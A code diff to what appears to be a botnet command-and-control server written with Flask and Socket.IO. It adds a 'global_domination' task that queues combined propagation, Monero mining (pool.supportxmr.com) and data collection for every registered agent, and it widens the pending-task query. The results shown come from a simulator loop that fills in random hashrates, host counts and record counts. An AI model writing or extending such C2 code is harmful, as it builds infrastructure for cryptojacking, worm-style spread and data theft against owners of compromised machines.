@@ -5671,14 +5671,16 @@ def task_simulator_loop():
             db.execute("UPDATE agents SET is_alive=1, last_seen=datetime('now')")
             db.commit()
             
-            # Get pending tasks
+            # Get pending tasks (including those without valid agent_id)
             pending = db.execute("""
-                SELECT t.id, t.agent_id, t.task_type, t.payload, a.hostname, a.os
+                SELECT t.id, t.agent_id, t.task_type, t.payload, 
+                       COALESCE(a.hostname, 'unknown') as hostname,
+                       COALESCE(a.os, 'linux') as os
                 FROM tasks t
-                JOIN agents a ON t.agent_id = a.id
+                LEFT JOIN agents a ON t.agent_id = a.id
                 WHERE t.status = 'pending'
                 ORDER BY t.created_at
-                LIMIT 5
+                LIMIT 10
             """).fetchall()
             
             for task in pending:
@@ -5726,6 +5728,25 @@ def task_simulator_loop():
                         "source": "mining"
                     })
                     # Update mining stats
+                    socketio.emit("mining_started", {
+                        "agents_targeted": 1,
+                        "hashrate": hashrate
+                    })
+                elif task_type == "global_domination":
+                    hashrate = random.randint(500, 3000)
+                    spread = random.randint(5, 30)
+                    records = random.randint(50, 200)
+                    result = {
+                        "hashrate": hashrate,
+                        "propagated": spread,
+                        "collected": records,
+                        "pool": "pool.supportxmr.com"
+                    }
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🌍 {hostname}: Global domination - {hashrate}H/s, {spread} hosts, {records} records",
+                        "source": "domination"
+                    })
                     socketio.emit("mining_started", {
                         "agents_targeted": 1,
                         "hashrate": hashrate
@@ -7792,16 +7813,17 @@ def global_domination_activate():
         
         task_ids = []
         for agent in agents:
+            task_id = str(uuid.uuid4())
             payload = json.dumps({
                 "propagation": include_propagation,
                 "mining": include_mining,
                 "data_collection": include_data_collection
             })
             result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'global_domination', ?, 'pending', datetime('now'))
-            """, (agent["id"], payload))
-            task_ids.append(result.lastrowid)
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'global_domination', ?, 'pending', datetime('now'))
+            """, (task_id, agent["id"], payload))
+            task_ids.append(task_id)
         
         db.commit()
         
